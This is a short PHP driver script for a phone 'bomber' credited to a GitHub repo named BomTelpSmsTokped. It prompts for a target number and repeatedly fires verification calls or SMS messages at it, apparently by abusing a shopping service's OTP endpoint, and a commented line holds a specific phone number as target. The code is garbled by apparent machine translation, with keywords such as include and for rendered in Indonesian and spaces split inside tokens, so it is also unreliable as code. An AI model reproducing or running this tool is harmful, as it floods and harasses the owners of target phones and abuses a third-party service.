<? php
termasuk  ' func.php ' ;
/ *
    https://github.com/nee48/BomTelpSmsTokped
    Dibuat oleh Bowo
* /
$ init  =  Bom baru  ();
// Eksekusi Call / Sms Boomber (Batas 3x / Jam)
echo  " Masukkan Tidak Ada Target \ n Input: " ;
$ a  =  trim ( fgets ( STDIN ));
$ init -> no  =  " $ a " ;
$ init -> type  =  2 ; // Ketik 2 untuk telpon, Ketik 1 untuk sms
// $ init-> no = "0895371761108"; // Nomer Hp tujuan
if ( $ init -> type  ==  1 ) {
	untuk ( $ i = 0 ; $ i  <  2 ; $ i ++ ) {
	    $ init -> Verif ( $ init -> no , $ init -> type );
	}
} elseif ( $ init -> type  ==  2 ) {
	 $ init -> Verif ( $ init -> no , $ init -> type );
}